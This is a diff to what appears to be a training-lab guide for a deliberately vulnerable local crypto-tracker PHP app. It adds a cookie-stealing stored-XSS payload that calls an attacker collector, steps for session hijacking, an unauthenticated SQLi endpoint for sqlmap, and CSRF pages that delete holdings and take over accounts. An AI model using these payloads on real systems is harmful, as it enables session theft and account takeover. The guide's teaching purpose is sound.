@@ -65,6 +65,10 @@ SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'x'
 ```
 The `-- ` turns the rest into a comment. Try `' OR '1'='1' -- ` too.
 
+There's also a **public, no-login** SQLi endpoint at
+`http://localhost/crypto-tracker/coins.php?q=BTC` — the easiest sqlmap target
+since it needs no session cookie at all.
+
 > Automating SQLi to dump the whole database → see **USING_SQLMAP.md**.
 
 ---
@@ -85,6 +89,30 @@ session cookie. It fires for anyone who views that portfolio — combine with ID
 
 The **display name** on the Profile page is the same kind of sink: set it to
 `<script>alert('xss-name')</script>` and it fires on the dashboard heading.
+
+#### Weaponised: steal the session cookie to a file
+An alert only proves execution. To actually **exfiltrate** the session, use a
+payload that ships `document.cookie` to the attacker's collector
+(`attacker/collect.php`). In **Notes**, enter (note the **double** quotes — a
+single quote would break the app's `INSERT ... '$notes'` and abort the save):
+
+```html
+<script>new Image().src="http://localhost/crypto-tracker/attacker/collect.php?c="+encodeURIComponent(document.cookie)</script>
+```
+
+Now whenever the victim loads the dashboard, `collect.php` appends their cookie
+to **`./attacker-loot/cookie.txt`** on your host (bind-mounted from the
+container). Read it with:
+
+```bash
+cat ./attacker-loot/cookie.txt
+# [2026-07-23 ...] ip=... ua=... cookie=PHPSESSID=<victim session>
+```
+
+Because `PHPSESSID` is **not** `HttpOnly`, `document.cookie` includes it — paste
+that value into your browser's cookie for `localhost` (DevTools → Application →
+Cookies) and you're logged in as the victim: **session hijack, no password
+needed.** `csrf_all.html` plants this exact payload for you via CSRF.
 
 ---
 
@@ -116,11 +144,27 @@ The page fetches the victim's own dashboard, scrapes the id of the **first**
 holding, and fires `delete_holding.php?id=<that id>` — no hardcoded id, so it
 always kills the top holding whatever it is.
 
+The page prints a live status log so you can **see** what it did:
+```
+[*] Reading victim dashboard...
+[+] First holding id = 6 -> deleting...
+[+] Done. Reload the victim dashboard — holding 6 is gone.
+```
+
 ✅ Reload the dashboard — the first holding is gone. The victim never clicked
 anything.
 
-> Serve it under the app's host (`http://localhost/...`) so the dashboard read
-> is same-origin; opening it as a bare `file://` blocks that read step.
+> **If the holdings stay put, read the status log — it tells you why:**
+> - **Must be same-origin.** Open it at
+>   `http://localhost/crypto-tracker/attacker/csrf_delete.html`, **not** as a
+>   `file://` and not on another port. The "read the dashboard" step is a
+>   same-origin fetch; a different origin blocks it and nothing deletes.
+> - **"Victim is NOT logged in"** — log in first, in the *same* browser, and
+>   keep that session.
+> - **Stale copy?** The attacker pages are now served `no-store`, so the browser
+>   won't cache them. If you tested earlier and got a stale `?id=1` version,
+>   hard-reload once (⇧⌘R) to clear it. (`?id=1` is *alice's* seed holding — an
+>   old cached PoC deletes that, not yours, which looks like "nothing happened".)
 
 **b) Account takeover + stored XSS** — open
 `crypto-tracker/attacker/csrf_addpw.html`. Two hidden auto-submitting forms fire:
